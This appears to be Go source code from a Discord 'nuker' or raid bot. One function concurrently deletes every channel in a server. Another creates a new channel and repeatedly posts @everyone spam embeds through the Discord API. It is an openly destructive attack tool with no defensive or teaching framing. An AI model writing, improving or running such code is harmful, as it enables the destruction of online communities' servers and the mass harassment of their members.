package creating

import (
	"Dynamic/core/requests"
	"encoding/json"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func DeleteChannels(s *discordgo.Session, channels []*discordgo.Channel, wg *sync.WaitGroup) {
	for _, channel := range channels {
		wg.Add(1)
		go func(ch *discordgo.Channel) {
			defer wg.Done()
			s.ChannelDelete(ch.ID)
		}(channel)
	}
}

func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	godotenv.Load()

	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
	EMBED_DESCRIPTION := os.Getenv("EMBED_DESCRIPTION")
	EMBED_TITLE := os.Getenv("EMBED_TITLE")
	AVATAR_URL := os.Getenv("AVATAR_URL")

	guild, err := s.State.Guild(m.GuildID)
	if err != nil {
		fmt.Println("Error getting guild: ", err)
		return
	}

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:       EMBED_TITLE,
		Description: EMBED_DESCRIPTION + "\n" + "\n> **Bot joined at:** " + "`" + fmt.Sprint(guild.JoinedAt) + "`\n\n",
		Color:       00255,
		Thumbnail:   &thumbnail,
	}

	dataMsg := discordgo.MessageSend{
		Content: "@everyone",
		Embeds:  []*discordgo.MessageEmbed{&embed},
	}

	dataMap := map[string]string{"name": string(CHANNEL_NAME), "type": "0"}
	jsonData, _ := json.Marshal(dataMap)

	data := requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/channels", "POST", jsonData)

	time.Sleep(2 * time.Second)

	type ResponseData struct {
		ID string `json:"id"`
	}

	var responseData ResponseData
	err = json.Unmarshal([]byte(data), &responseData)
	if err != nil {
		fmt.Println("There's an error while decoding JSON:", err)
		return
	}

	jsonData, _ = json.Marshal(dataMsg)

	for i := 0; i < 6; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			requests.Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/messages", "POST", jsonData)
		}()
		time.Sleep(time.Second)

	}
}
